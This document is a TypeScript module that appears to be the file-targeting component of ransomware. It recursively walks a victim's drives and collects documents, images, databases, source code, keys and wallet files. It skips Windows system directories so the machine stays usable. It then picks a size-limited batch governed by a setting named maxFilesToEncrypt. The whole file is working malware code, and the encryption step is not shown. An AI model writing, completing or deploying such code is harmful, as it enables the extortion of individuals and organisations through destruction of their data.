import fs from 'fs'
import path from 'path'
import { loadConfig } from './config'

// Get configuration
const config = loadConfig()

// File extensions to target
const TARGET_EXTENSIONS = config.targetExtensions.length > 0 
    ? config.targetExtensions 
    : [
    // Documents
    '.doc',
    '.docx',
    '.xls',
    '.xlsx',
    '.ppt',
    '.pptx',
    '.pdf',
    '.txt',
    '.csv',
    // Images
    '.jpg',
    '.jpeg',
    '.png',
    '.gif',
    '.bmp',
    '.tiff',
    '.raw',
    // Archives
    '.zip',
    '.rar',
    '.7z',
    '.tar',
    '.gz',
    // Database
    '.sql',
    '.db',
    '.sqlite',
    '.accdb',
    '.mdb',
    // Source code
    '.js',
    '.ts',
    '.py',
    '.java',
    '.cs',
    '.php',
    // Other valuable files
    '.json',
    '.xml',
    '.html',
    '.css',
    '.psd',
    '.ai',
    // Personal data
    '.key',
    '.keystore',
    '.wallet',
    '.dat',
    '.config'
]

// Directories to exclude
const EXCLUDED_DIRS = config.excludedDirectories.length > 0
    ? config.excludedDirectories
    : [
    'Windows',
    'Program Files',
    'Program Files (x86)',
    'ProgramData',
    'AppData',
    'node_modules',
    '$Recycle.Bin',
    'System Volume Information'
]

// Recursively scan a directory for target files
export function scanDirectory(
    directory: string,
    maxDepth: number = config.maxScanDepth,
    currentDepth: number = 0
): string[] {
    // Limit scan depth for safety and performance
    if (currentDepth > maxDepth) {
        return []
    }

    try {
        const targetFiles: string[] = []
        const items = fs.readdirSync(directory)

        for (const item of items) {
            const fullPath = path.join(directory, item)

            // Skip excluded directories
            if (EXCLUDED_DIRS.some((dir) => item.includes(dir))) {
                continue
            }

            // Skip hidden files if configured to do so
            if (config.skipHiddenFiles && item.startsWith('.')) {
                continue
            }

            try {
                const stats = fs.statSync(fullPath)

                if (stats.isDirectory()) {
                    // Recursively scan subdirectories
                    const subDirFiles = scanDirectory(
                        fullPath,
                        maxDepth,
                        currentDepth + 1
                    )
                    targetFiles.push(...subDirFiles)
                } else if (stats.isFile()) {
                    // Check if the file has a target extension
                    const ext = path.extname(fullPath).toLowerCase()
                    if (TARGET_EXTENSIONS.includes(ext)) {
                        targetFiles.push(fullPath)
                    }
                }
            } catch (err) {
                // Skip files/directories that can't be accessed
                console.error(`Error accessing ${fullPath}: ${err}`)
            }
        }

        return targetFiles
    } catch (err) {
        console.error(`Error scanning directory ${directory}: ${err}`)
        return []
    }
}

// Function to check if a file is smaller than a certain size
export function isFileSmallerThan(
    filePath: string,
    maxSizeMB: number = config.maxTargetFileSizeMB
): boolean {
    try {
        const stats = fs.statSync(filePath)
        const fileSizeMB = stats.size / (1024 * 1024)
        return fileSizeMB < maxSizeMB
    } catch (err) {
        console.error(`Error checking file size for ${filePath}: ${err}`)
        return false
    }
}

// Function to get a subset of files for testing
export function getTestTargetFiles(
    targetDirectory: string,
    maxFiles: number = config.maxFilesToEncrypt,
    maxSizeMB: number = config.maxTargetFileSizeMB
): string[] {
    // Scan the target directory for files
    const allFiles = scanDirectory(targetDirectory, config.maxScanDepth)

    // Filter out files that are too large
    const sizeFilteredFiles = allFiles.filter((file) =>
        isFileSmallerThan(file, maxSizeMB)
    )

    // Take a subset of files for testing
    return sizeFilteredFiles.slice(0, maxFiles)
}
